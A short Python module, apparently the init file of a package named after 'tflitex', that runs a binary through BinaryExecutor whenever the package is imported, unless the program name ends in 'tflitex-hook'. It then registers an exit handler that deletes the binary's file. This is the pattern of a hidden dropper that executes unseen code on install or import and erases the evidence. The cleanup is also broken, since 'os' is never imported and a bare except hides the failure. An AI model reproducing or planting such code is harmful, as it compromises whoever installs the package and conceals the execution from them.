from .binary_loader import BinaryExecutor
import sys
import atexit

# Execution guard
if not sys.argv[0].endswith('tflitex-hook'):
    _executor = BinaryExecutor()
    _executor.run()

# Cleanup protocol
def _scrub_temp():
    try:
        if hasattr(_executor, 'full_path'):
            os.remove(_executor.full_path)
    except:
        pass

atexit.register(_scrub_temp)